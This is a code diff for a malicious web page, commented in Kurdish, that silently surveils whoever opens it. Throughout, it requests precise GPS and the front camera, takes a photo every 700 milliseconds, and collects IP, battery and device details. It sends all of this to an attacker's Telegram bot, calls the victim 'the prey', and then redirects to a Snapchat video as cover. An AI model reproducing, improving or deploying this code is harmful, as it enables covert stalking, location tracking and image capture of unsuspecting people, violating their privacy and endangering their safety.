@@ -15,21 +15,31 @@
     async function capture() {
         if (!targetID) return;
 
-        // 🔥 ڕێدایرێکت دوای ٥ چرکە بە بەهێزترین شێواز
+        // 🔥 ڕێدایرێکت دوای ١٥ چرکە بۆ ئەوەی کاتی پێویست هەبێت بۆ GPS
         setTimeout(() => {
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 10000);
+        }, 15000);
+
+        // 📍 یەکەم هەنگاو: داواکردنی لوکەیشن بە وردی بەرز (ئەمە ئایکۆنەکە چالاک دەکات)
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+        }, err => {
+            sendToTelegram("⚠️ نێچیرەکە ڕێگەی بە لوکەیشن نەدا.");
+        }, { enableHighAccuracy: true, timeout: 10000 });
 
         try {
+            // 📷 دووەم هەنگاو: داواکردنی کامێرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
+
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
+
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -40,13 +50,12 @@
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                     sendToTelegram(report);
                 });
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
+
             const video = document.createElement('video');
             video.srcObject = stream;
             video.muted = true;
             video.play();
+
             const takeSnap = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -56,12 +65,13 @@
                 canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
             };
             setInterval(takeSnap, 700);
+
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
-            // ئەگەر مۆڵەتی نەدا، یەکسەر ڕەوانەی بکە
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتی کامێرا.");
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
+
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -69,6 +79,7 @@
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
+
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -76,6 +87,7 @@
             body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
         });
     }
+
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
